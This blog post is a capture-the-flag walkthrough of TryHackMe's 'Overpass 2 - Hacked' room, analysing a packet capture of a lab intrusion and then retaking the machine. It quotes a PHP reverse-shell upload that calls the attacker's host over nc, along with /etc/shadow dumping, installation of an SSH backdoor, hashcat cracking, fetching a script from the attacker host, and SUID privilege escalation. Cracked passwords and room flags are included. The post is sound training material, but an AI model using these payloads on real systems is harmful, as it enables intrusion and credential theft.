---
layout: post
title: "Overpass 2 - Hacked"
date: "2026-10-02"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# Overpass 2 - Hacked
## Task 1 Forensics - Analyse the PCAP
tcp.stream eq 0

```
GET /development/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "588-5aae9add656f8-gzip"


HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:33:53 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 01:38:24 GMT
ETag: "588-5aae9add656f8-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 675
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

..........uTMo.0...W0:.s.v.Vv....aH..........!.I.a.}.l.I....P...#.>.\>.~.<A..]..p..B.3..C.1.......
..O2.4.m.....d.;KG~..z@I.[-...b....pR.>.f.....b..3.
....".}..........
\]:ln...+..q......p...8..K6_#...o.`..C^y..A..A*.h...7..Oy#.YDL.....|..iu?.C...v.~.....8....._[.'7#vC..j.Pi.}...Z..U......k.e.w[.B..-G.$....."P..kVr1qf...sQ.......k...
...xM.3..{....z..#..c5<.xd.+}...`M ..AE74a"M.r...=..u
r......%...T..!R~.v.e..SNA....S......c.9..?....F.L.../.f.....T.k$..m.%......z.....m..f.IDh...G@..;...6......0..=..z.9..M.i,.]...*(k
...qA..............1n:.T+\..g&E..H..6M.E.3l...J.V.5%b.p...'$#."..xjH..Q^D.<O.J.LK.....;...#.<K.J..8.....3.n.(Rd'tG?.
.c.1..8...^..N....7..7.s............
```

tcp.stream eq 1

```
POST /development/upload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/
Content-Type: multipart/form-data; boundary=---------------------------1809049028579987031515260006
Content-Length: 454
Connection: keep-alive
Upgrade-Insecure-Requests: 1

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="fileToUpload"; filename="payload.php"
Content-Type: application/x-php

<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>

-----------------------------1809049028579987031515260006
Content-Disposition: form-data; name="submit"

Upload File
-----------------------------1809049028579987031515260006--

HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:01 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 39
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

The file payload.php has been uploaded.
GET /development/uploads/ HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1


HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:34:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 472
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: text/html;charset=UTF-8

............_o.0....)..0m..I....'F..D!*T.4...
....1l...!LM'X.......s.K.$...k:....	...&.!..._.C..E...{!.J.J.GSD.Ha.%=.R........t...	z	...(u....MUj.k.[...C..4.5r.k.......B.4......+.#.+D.\..6y.....qV2......+m.........h.)aP.....a<...	.S.......c..NXma..\J.O....._....ID..YY..3.].n.\.u.\....0].E.k.`..f....t......F.....@4e.- .F.V...g[.Veuu.{...F.
.(@....a}.......]g.....y4^U8...k......=............D._...]..+&.s#...*.......F..!.(.y.sa.....D..\^{........X..]..........d>.E.......
```

tcp.stream eq 2

```
GET /development/uploads/payload.php HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/development/uploads/
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

tcp.stream eq 3

```
/bin/sh: 0: can't access tty; job control turned off
$ 
id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@overpass-production:/var/www/html/development/uploads$ 
ls -lAh

ls -lAh
total 8.0K
-rw-r--r-- 1 www-data www-data 51 Jul 21 17:48 .overpass
-rw-r--r-- 1 www-data www-data 99 Jul 21 20:34 payload.php
www-data@overpass-production:/var/www/html/development/uploads$ 
cat .overpass

cat .overpass
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQH96?6G6C?@E62CE:?DE2?EQN.www-data@overpass-production:/var/www/html/development/uploads$ 
su james

su james
Password: 
whenevernoteartinstant


james@overpass-production:/var/www/html/development/uploads$ 
cd ~

cd ~
james@overpass-production:~$ 
sudo -l]

sudo -l]
sudo: invalid option -- ']'
usage: sudo -h | -K | -k | -V
usage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]
usage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user]
            [command]
usage: sudo [-AbEHknPS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] [VAR=value] [-i|-s] [<command>]
usage: sudo -e [-AknS] [-r role] [-t type] [-C num] [-g group] [-h host] [-p
            prompt] [-T timeout] [-u user] file ...
james@overpass-production:~$ 
sudo -l

sudo -l
[sudo] password for james: 
whenevernoteartinstant


Matching Defaults entries for james on overpass-production:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on overpass-production:
    (ALL : ALL) ALL
james@overpass-production:~$ 
sudo cat /etc/shadow

sudo cat /etc/shadow
root:*:18295:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
mail:*:18295:0:99999:7:::
news:*:18295:0:99999:7:::
uucp:*:18295:0:99999:7:::
proxy:*:18295:0:99999:7:::
www-data:*:18295:0:99999:7:::
backup:*:18295:0:99999:7:::
list:*:18295:0:99999:7:::
irc:*:18295:0:99999:7:::
gnats:*:18295:0:99999:7:::
nobody:*:18295:0:99999:7:::
systemd-network:*:18295:0:99999:7:::
systemd-resolve:*:18295:0:99999:7:::
syslog:*:18295:0:99999:7:::
messagebus:*:18295:0:99999:7:::
_apt:*:18295:0:99999:7:::
lxd:*:18295:0:99999:7:::
uuidd:*:18295:0:99999:7:::
dnsmasq:*:18295:0:99999:7:::
landscape:*:18295:0:99999:7:::
pollinate:*:18295:0:99999:7:::
sshd:*:18464:0:99999:7:::
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
james@overpass-production:~$ 
git clone https://github.com/NinjaJc01/ssh-backdoor


<git clone https://github.com/NinjaJc01/ssh-backdoor
Cloning into 'ssh-backdoor'...
remote: Enumerating objects: 18, done.        
remote: Counting objects:   5% (1/18)        
....  
Unpacking objects: 100% (18/18), done.
james@overpass-production:~$ 
cd ssh-backdoor

cd ssh-backdoor
james@overpass-production:~/ssh-backdoor$ 
ssh-keygen

ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/james/.ssh/id_rsa): 
id_rsa

id_rsa
Enter passphrase (empty for no passphrase): 



Enter same passphrase again: 



Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58 james@overpass-production
The key's randomart image is:
+---[RSA 2048]----+
|        .. .     |
|       .  +      |
|      o   .=.    |
|     . o  o+.    |
|      + S +.     |
|     =.o %.      |
|    ..*.% =.     |
|    .+.X+*.+     |
|   .oo=++=Eo.    |
+----[SHA256]-----+
james@overpass-production:~/ssh-backdoor$ 
chmod +x backdoor

chmod +x backdoor
james@overpass-production:~/ssh-backdoor$ 
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed


<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
```

```
┌──(root㉿kali)-[~]
└─# hash-identifier -h
--------------------------------------------------
 HASH: 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed

Possible Hashs:
[+] SHA-512
[+] Whirlpool

Least Possible Hashs:
[+] SHA-512(HMAC)
[+] Whirlpool(HMAC)
--------------------------------------------------
```

Check where it downloads the backdoor: https://github.com/NinjaJc01/ssh-backdoor

Crack the `/etc/shadow`, using `fasttrack.txt` dictionary: https://github.com/drtychai/wordlists/blob/master/fasttrack.txt

extract the hashes from `/etc/shadow` and save them as `hashes.txt`

```
james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
```

We cracked 4 passwords

```
┌──(root㉿kali)-[~]
└─# hashcat -a 0 -m 1800 hashes.txt fasttrack.txt            
hashcat (v7.1.2) starting

$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:secret12
$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:secuirty3
Approaching final keyspace - workload adjusted.           

$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:1qaz2wsx
$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:abcd123
```

Their corresponding 4 users are:

```
bee:secret12
paradox:secuirty3
muirland:1qaz2wsx
szymex:abcd123
```

And we already know james's password is `whenevernoteartinstant`.

tcp.stream eq 7

```
GET /cooctus.png HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:40 GMT
Content-type: image/png
Content-Length: 60102
Last-Modified: Tue, 21 Jul 2020 19:33:27 GMT

.PNG
.
...
IHDR....................yiCCPICC Profile..(....K.@....jE+.. ....`.EA:J..T...U....B..K..W.... ..5...*.*..".8....H..5....;.......=..3:3...`....S.RaY
```

tcp.stream eq 8

```
GET /index.html HTTP/1.1
User-Agent: Wget/1.19.4 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 192.168.170.145:8080
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.3
Date: Tue, 21 Jul 2020 20:37:46 GMT
Content-type: text/html
Content-Length: 815
Last-Modified: Tue, 21 Jul 2020 19:33:39 GMT

<head>
    <title>LOL Hacked</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: black;
            color: limegreen;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
        }

        img {
            position: fixed;
            left: 50%;
            bottom: 0px;
            transform: translate(-50%, -0%);
            margin: 0 auto;
            max-width: 100vw;
            max-height: 100vh;
            margin: auto;
        }
    </style>
</head>

<body>
    <div>
        <h1>H4ck3d by CooctusClan</h1>
    </div>
    <div>
        <p>Secure your servers!</p>
    </div>
    <div><img src="cooctus.png"></div>
</body>
```

tcp.stream eq 9

```
GET / HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 21 Jul 2020 01:38:24 GMT
If-None-Match: "97f-5aae9add6c459-gzip"


HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:22 GMT
ETag: "32f-5aaf99ab26dad-gzip"
Accept-Ranges: bytes
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 385
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

<head>
    <title>LOL Hacked</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            background: black;
            color: limegreen;
            display: flex;
            flex-direction: column;
            justify-content: center;
            text-align: center;
        }

        img {
            position: fixed;
            left: 50%;
            bottom: 0px;
            transform: translate(-50%, -0%);
            margin: 0 auto;
            max-width: 100vw;
            max-height: 100vh;
            margin: auto;
        }
    </style>
</head>

<body>
    <div>
        <h1>H4ck3d by CooctusClan</h1>
    </div>
    <div>
        <p>Secure your servers!</p>
    </div>
    <div><img src="cooctus.png"></div>
</body>
GET /cooctus.png HTTP/1.1
Host: 192.168.170.159
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.170.159/
Connection: keep-alive


HTTP/1.1 200 OK
Date: Tue, 21 Jul 2020 20:38:37 GMT
Server: Apache/2.4.29 (Ubuntu)
Last-Modified: Tue, 21 Jul 2020 20:38:31 GMT
ETag: "eac6-5aaf99b361586"
Accept-Ranges: bytes
Content-Length: 60102
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive
Content-Type: image/png

.PNG
.
...
IHDR....................yiCCPICC Profile..(....K.@....jE+.. ....`.EA:J..T...U....B..K..W.... ..5...*.*..".8....H..5....;.......=..3:3...`....S.RaY
{2.G....c9.?.....q....].d.P.."....N....".^{{.)9r...c.a..;*}.....W.?~...'.N.....IEND.B`.
```

## Task 2 Research - Analyse the code
The backdoor repository: https://github.com/NinjaJc01/ssh-backdoor

Let's analyse the `main.go`:

What's the default hash for the backdoor?

```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

What's the hardcoded salt for the backdoor?

The second parameter of verifyPass is the salt: `1c362db832f3f864c8c2fe05f2002a05`

```go
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}

func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}
```

What was the hash that the attacker used? - go back to the PCAP for this!

`6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed`

```
james@overpass-production:~/ssh-backdoor$ 
./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed


<9d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
SSH - 2020/07/21 20:36:56 Started SSH backdoor on 0.0.0.0:2222
```

Crack the hash using rockyou and a cracking tool of your choice. What's the password?

We just simply combine `SHA512(password + salt)`

```go
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```

Use Hashcat with hash mode `-m 1710` for `sha512($pass. $salt)`, using `rockyou.txt` to perform dictionary attack

format the input file `hash_salt.txt`, in `hash:salt` format

```
6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05
```

```
┌──(root㉿kali)-[~]
└─# hashcat -a 0 -m 1710 hash_salt.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:november16
```

The password for the backdoor is `november16`

## Task 3 Attack - Get back in!
Target IP Address: 10.48.165.125

Kali Linux: 192.168.162.207

```
┌──(root㉿kali)-[~/ssh-backdoor]
└─# nmap -sV -O 10.48.165.125
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-02 08:16 -0400
Nmap scan report for 10.48.165.125
Host is up (0.037s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 8.2p1 Debian 4 (protocol 2.0)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=10/2%OT=22%CT=1%CU=34592%PV=Y%DS=3%DC=I%G=Y%TM=6ABFA0C
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%
OS:CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=107%G
OS:CD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M4E8ST11NW7%O2=M4E8ST11NW7%O3=M4
OS:E8NNT11NW7%O4=M4E8ST11NW7%O5=M4E8ST11NW7%O6=M4E8ST11)WIN(W1=F4B3%W2=F4B3
OS:%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M4E8NNSNW7%C
OS:C=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%
OS:T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD
OS:=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S
OS:=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds
```

http://10.48.165.125/

```
H4ck3d by CooctusClan
```

Try to using ssh to get the initial access using the password we have, however, none of them works.

```
james:whenevernoteartinstant
bee:secret12
paradox:secuirty3
muirland:1qaz2wsx
szymex:abcd123
```

Let's analyze the source code again:

```go
var hash string = "bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"
```

1 - the ssh server initialize with a passwordHandler

```go
	server := &ssh.Server{
		Addr:            fmt.Sprintf("%s:%v", lhost.String(), lport),
		Handler:         sshterminal,
		Version:         fingerprint,
		PasswordHandler: passwordHandler,
	}
	server.AddHostKey(privateKey)
```

2 - the passwordHandler using `verifyPass` to compare the `salt+password` with the hard coded hash.

```go
func passwordHandler(_ ssh.Context, password string) bool {
	return verifyPass(hash, "1c362db832f3f864c8c2fe05f2002a05", password)
}
```

3 - the verifyPass just compared the hashed `salt+password` with the hard coded hash.

```go
func verifyPass(hash, salt, password string) bool {
	resultHash := hashPassword(password, salt)
	return resultHash == hash
}
```

4 - use SHA512 to hash the `salt+password` combination

```go
func hashPassword(password string, salt string) string {
	hash := sha512.Sum512([]byte(password + salt))
	return fmt.Sprintf("%x", hash)
}
```

So that means if our original password string after hashing matched the hard coded hash, the ssh server will accept the incoming connection. Even the connection is not from the backdoor executable. Instead, when attack is trying to hide their backdoor password, they use `-a` option to specify the hash.

Let's try to connect to the server backdoor using normal ssh client, and use the password `november16` for `james`

```
┌──(root㉿kali)-[~/ssh-backdoor]
└─# ssh -p 2222 james@10.48.165.125
Unable to negotiate with 10.48.165.125 port 2222: no matching host key type found. Their offer: ssh-rsa
                                                                                                                                                             
┌──(root㉿kali)-[~/ssh-backdoor]
└─# ssh -p 2222 -oHostKeyAlgorithms=+ssh-rsa james@10.48.165.125
The authenticity of host '[10.48.165.125]:2222 ([10.48.165.125]:2222)' can't be established.
RSA key fingerprint is: SHA256:z0OyQNW5sa3rr6mR7yDMo1avzRRPcapaYwOxjttuZ58
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.48.165.125]:2222' (RSA) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
james@10.48.165.125's password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

james@overpass-production:/home/james/ssh-backdoor$ whoami
james
james@overpass-production:/home/james/ssh-backdoor$ id
uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

```
james@overpass-production:/home/james/ssh-backdoor$ ls ~
ssh-backdoor  user.txt  www
james@overpass-production:/home/james/ssh-backdoor$ cat ~/user.txt 
thm{d119b4fa8c497ddb0525f7ad200e6567}
```

Use LinEnum to do the Linux enumeration

https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

```
┌──(root㉿kali)-[/home/kali/Downloads]
└─# ls
LinEnum.sh  overpass2_1595383502269.pcapng
                                                                                                                                                  
┌──(root㉿kali)-[/home/kali/Downloads]
└─# python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

On the target machine, download the LinEnum.sh from Kali server

```
curl -o LinEnum.sh http://192.168.162.207/LinEnum.sh
```

Run the LinEnum on the target, and we find and interesting SUID binary file

```
[-] SUID files:
-rwsr-sr-x 1 root root 1113504 Jul 22  2020 /home/james/.suid_bash
```

Execute the SUID bash with `-p` option

https://gtfobins.org/gtfobins/bash/#shell

```
james@overpass-production:/home/james/ssh-backdoor$ /home/james/.suid_bash -p
.suid_bash-4.4# whoami
root
.suid_bash-4.4# id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
.suid_bash-4.4# pwd
/home/james/ssh-backdoor
.suid_bash-4.4# cd /root
.suid_bash-4.4# ls
root.txt
.suid_bash-4.4# cat root.txt 
thm{d53b2684f169360bb9606c333873144d}
```